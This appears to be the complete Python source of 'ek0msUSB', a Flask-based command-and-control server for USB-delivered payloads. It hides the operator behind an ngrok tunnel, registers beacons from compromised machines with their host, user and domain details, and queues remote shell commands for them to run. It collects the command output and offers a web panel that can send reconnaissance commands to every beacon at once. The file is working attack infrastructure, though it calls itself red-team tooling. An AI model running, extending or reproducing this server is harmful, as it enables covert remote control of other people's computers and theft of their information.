#!/usr/bin/env python3
"""
ek0msUSB C2 Server - Complete Command & Control
"""

from flask import Flask, request, jsonify, render_template_string
import threading
import time
import json
import os
from datetime import datetime
from pyngrok import ngrok, conf
import requests

app = Flask(__name__)
app.secret_key = 'ek0msSavi0r_red_team'

# Global storage for beacons and commands
beacons = []
pending_commands = {}
command_results = {}

class C2Server:
    def __init__(self):
        self.ngrok_tunnel = None
        self.public_url = None
    
    def print_banner(self):
        banner = """
        ╔══════════════════════════════════════════════╗
                                   ek0msUSB                              
                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
                    ⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
                    ⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
                                     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                               
                                   C2 Server
        ╚══════════════════════════════════════════════╝
        """
        print(banner)
    
    def start_ngrok_tunnel(self, port=5000):
        """Start ngrok tunnel with proper configuration"""
        try:
            print("[*] Starting ngrok tunnel for OPSEC...")
            
            # Kill any existing ngrok processes
            ngrok.kill()
            
            # Create ngrok tunnel
            self.ngrok_tunnel = ngrok.connect(port, proto="http", bind_tls=True)
            self.public_url = self.ngrok_tunnel.public_url
            
            print(f"[+] Ngrok tunnel created: {self.public_url}")
            print("[+] Payloads will call back to this URL (not your local IP!)")
            
            return self.public_url
            
        except Exception as e:
            print(f"[-] Ngrok error: {e}")
            print("[!] Falling back to localhost (NOT RECOMMENDED FOR OPERATIONS)")
            return f"http://localhost:{port}"
    
    def get_ngrok_url(self):
        """Get the current ngrok URL"""
        return self.public_url

# ==================== C2 ROUTES ====================

@app.route('/beacon', methods=['POST', 'GET'])
def beacon():
    """Handle beacon callbacks with OPSEC considerations"""
    if request.method == 'GET':
        return "C2 Server Active"
    
    try:
        # Get client IP but don't log sensitive info
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        data = request.get_json() or {}
        hostname = data.get('hostname', 'UNKNOWN')
        username = data.get('username', 'UNKNOWN')
        domain = data.get('domain', 'UNKNOWN')
        os_info = data.get('os', 'UNKNOWN')
        arch = data.get('arch', 'UNKNOWN')
        
        # Create beacon ID for command tracking
        beacon_id = f"{hostname}_{username}"
        
        # Beacon information
        beacon_info = {
            'beacon_id': beacon_id,
            'hostname': hostname,
            'username': username,
            'domain': domain,
            'os': os_info,
            'arch': arch,
            'last_checkin': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'ip_address': client_ip
        }
        
        # Check if this beacon already exists
        existing = next((b for b in beacons if b['beacon_id'] == beacon_id), None)
        if existing:
            existing.update(beacon_info)
            print(f"[↻] Beacon update: {username}@{hostname}")
        else:
            beacons.append(beacon_info)
            print(f"[+] NEW BEACON: {username}@{hostname} ({os_info})")
        
        # Return commands if any are pending
        commands = pending_commands.get(beacon_id, [])
        if commands:
            print(f"[→] Sending {len(commands)} commands to {beacon_id}")
            # Clear commands after sending
            pending_commands[beacon_id] = []
        
        response = {
            'status': 'active', 
            'next_checkin': 60,
            'message': 'Continue',
            'commands': commands
        }
        
        return jsonify(response)
    
    except Exception as e:
        print(f"[-] Beacon error: {e}")
        return jsonify({'status': 'error'})

@app.route('/commands/<beacon_id>', methods=['GET'])
def get_commands(beacon_id):
    """Get pending commands for a beacon (legacy endpoint)"""
    commands = pending_commands.get(beacon_id, [])
    # Clear commands after retrieval
    pending_commands[beacon_id] = []
    return jsonify(commands)

@app.route('/command', methods=['POST'])
def add_command():
    """Add a command for a beacon to execute"""
    try:
        data = request.json
        beacon_id = data.get('beacon_id')
        command_data = data.get('command')
        
        if not beacon_id or not command_data:
            return jsonify({'error': 'Missing beacon_id or command'}), 400
        
        if beacon_id not in pending_commands:
            pending_commands[beacon_id] = []
        
        # Add command ID for tracking
        command_id = f"cmd_{int(time.time())}_{len(pending_commands[beacon_id])}"
        command_data['id'] = command_id
        
        pending_commands[beacon_id].append(command_data)
        
        print(f"[+] Command queued for {beacon_id}: {command_data.get('type', 'unknown')}")
        
        return jsonify({
            'status': 'queued', 
            'command_id': command_id,
            'beacon_id': beacon_id
        })
        
    except Exception as e:
        print(f"[-] Command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/results', methods=['POST'])
def store_results():
    """Store command execution results"""
    try:
        data = request.json
        beacon_id = data.get('beacon_id')
        command_id = data.get('command_id')
        result = data.get('result')
        
        if not all([beacon_id, command_id, result]):
            return jsonify({'error': 'Missing required fields'}), 400
        
        # Store result
        if beacon_id not in command_results:
            command_results[beacon_id] = []
        
        result_entry = {
            'command_id': command_id,
            'result': result,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        command_results[beacon_id].append(result_entry)
        
        print(f"[✓] Result from {beacon_id}: {result[:100]}...")
        
        return jsonify({'status': 'received'})
        
    except Exception as e:
        print(f"[-] Results error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/admin')
def admin():
    """Enhanced admin panel with command interface"""
    admin_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>ek0msUSB C2 Admin</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a1a; color: #00ff00; }
            .container { max-width: 1200px; margin: 0 auto; }
            .section { background: #2a2a2a; padding: 20px; margin: 10px 0; border-radius: 5px; }
            .beacon { border: 1px solid #444; padding: 10px; margin: 5px 0; }
            .command-form { display: flex; gap: 10px; margin: 10px 0; }
            input, textarea, button { padding: 8px; background: #333; color: #0f0; border: 1px solid #444; }
            button { cursor: pointer; }
            .results { background: #111; padding: 10px; margin: 5px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>ek0msUSB C2 Admin Panel</h1>
            
            <div class="section">
                <h2>Active Beacons ({{ beacons|length }})</h2>
                {% for beacon in beacons %}
                <div class="beacon">
                    <strong>{{ beacon.beacon_id }}</strong><br>
                    OS: {{ beacon.os }} | Last: {{ beacon.last_checkin }}<br>
                    
                    <div class="command-form">
                        <input type="text" id="cmd_{{ loop.index0 }}" placeholder="Enter command (e.g., whoami)" value="whoami">
                        <button onclick="sendCommand('{{ beacon.beacon_id }}', document.getElementById('cmd_{{ loop.index0 }}').value)">
                            Send Command
                        </button>
                    </div>
                    
                    <div id="results_{{ beacon.beacon_id }}" class="results">
                        {% if command_results.get(beacon.beacon_id) %}
                            <h4>Recent Results:</h4>
                            {% for result in command_results[beacon.beacon_id][-5:] %}
                                <div><small>{{ result.timestamp }}:</small> {{ result.result[:200] }}...</div>
                            {% endfor %}
                        {% endif %}
                    </div>
                </div>
                {% endfor %}
            </div>
            
            <div class="section">
                <h2>Quick Commands</h2>
                <button onclick="sendToAll('whoami')">Whoami (All)</button>
                <button onclick="sendToAll('ipconfig')">IP Config (All)</button>
                <button onclick="sendToAll('systeminfo')">System Info (All)</button>
                <button onclick="sendToAll('net user')">Users (All)</button>
            </div>
            
            <div class="section">
                <h2>Server Info</h2>
                <p>Server Time: {{ server_time }}</p>
                <p>Total Beacons: {{ beacons|length }}</p>
                <p>Pending Commands: {{ pending_commands_count }}</p>
                <p>Version: ek0msUSB v2.0</p>
            </div>
        </div>
        
        <script>
            function sendCommand(beaconId, command) {
                fetch('/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        beacon_id: beaconId,
                        command: {
                            type: 'shell',
                            command: command
                        }
                    })
                }).then(r => r.json()).then(data => {
                    alert('Command sent: ' + data.command_id);
                });
            }
            
            function sendToAll(command) {
                {% for beacon in beacons %}
                sendCommand('{{ beacon.beacon_id }}', command);
                {% endfor %}
            }
            
            // Auto-refresh every 30 seconds
            setTimeout(() => location.reload(), 30000);
        </script>
    </body>
    </html>
    """
    
    pending_commands_count = sum(len(cmds) for cmds in pending_commands.values())
    
    return render_template_string(admin_html,
        beacons=beacons,
        command_results=command_results,
        server_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        pending_commands_count=pending_commands_count
    )

@app.route('/beacons')
def list_beacons():
    """API endpoint to list all active beacons"""
    return jsonify({
        'beacons': beacons,
        'total': len(beacons),
        'server_time': datetime.now().isoformat()
    })

@app.route('/results/<beacon_id>')
def get_results(beacon_id):
    """Get command results for a specific beacon"""
    results = command_results.get(beacon_id, [])
    return jsonify({
        'beacon_id': beacon_id,
        'results': results,
        'total_results': len(results)
    })

@app.route('/')
def index():
    return """
    <html>
        <body style="font-family: Arial; background: #1a1a1a; color: #0f0; padding: 20px;">
            <h1>ek0msUSB C2 Server - Active</h1>
            <p>Endpoints:</p>
            <ul>
                <li><a href="/admin" style="color: #0ff;">/admin</a> - Command & Control Panel</li>
                <li><a href="/beacons" style="color: #0ff;">/beacons</a> - List active beacons</li>
                <li>/beacon - Beacon check-in (POST)</li>
                <li>/command - Send commands (POST)</li>
                <li>/results - Get command results (POST)</li>
            </ul>
        </body>
    </html>
    """

def run_server(port=5000, use_ngrok=True):
    """Start the C2 server with proper OPSEC"""
    c2 = C2Server()
    c2.print_banner()
    
    if use_ngrok:
        public_url = c2.start_ngrok_tunnel(port)
        
        print(f"\n OPSEC CONFIGURATION READY:")
        print(f"   Public URL: {public_url}")
        print(f"   Local URL: http://localhost:{port}")
        print(f"   Admin Panel: {public_url}/admin")
        
        # This is the URL we'll embed in payloads
        c2_url = public_url
    else:
        print(f"[!] WARNING: Running without ngrok - OPSEC RISK!")
        print(f"[!] Payloads will contain your local IP address!")
        c2_url = f"http://localhost:{port}"
    
    print(f"\n Payload Configuration URL: {c2_url}")
    print(" Server endpoints:")
    print("   • /              - Server status")
    print("   • /admin         - Interactive C2 panel") 
    print("   • /beacons       - List active beacons")
    print("   • /beacon        - Beacon check-in")
    print("   • /command       - Send commands to beacons")
    print("   • /results       - Command results")
    print("   • /commands/<id> - Legacy command endpoint")
    
    print("\n C2 Features:")
    print("   • Real-time beacon monitoring")
    print("   • Interactive command execution") 
    print("   • Command result collection")
    print("   • Web-based admin interface")
    print("   • Multiple beacon support")
    
    print("\n Starting Flask server...")
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
    
    return c2_url

if __name__ == "__main__":
    run_server()